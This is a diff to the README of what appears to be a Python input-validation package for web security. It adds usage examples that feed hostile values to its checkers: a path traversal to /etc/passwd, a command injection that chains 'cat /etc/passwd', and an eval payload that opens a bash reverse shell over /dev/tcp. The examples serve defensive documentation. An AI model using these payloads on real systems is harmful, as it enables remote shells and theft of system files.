@@ -37,3 +37,10 @@ This is a simple and very light weight python package to help securing python we
 <h3> Path Traversal:</h3>
 <h4> Check if the file is safe to open/download or not:</h4>
 <div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">PATH_TRAVERSAL.check("../../../../../../etc/passwd")#returns 'True' if it's safe and 'False' if not  </pre></div>
+
+<h3> RCE (Remote Code/Command Execution):</h3>
+<h4> Check value is safe to pass to a command or not:</h4>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">RCE.command("ls -a ;cat /etc/passwd ")#returns 'True' if it's safe and 'False' if not  </pre></div>
+<h4> Check value is safe to pass to an "eval" function or not:</h4>
+<div style="background: #f8f8f8; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">RCE.command("__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1")#returns 'True' if it's safe and 'False' if not  </pre></div>
+
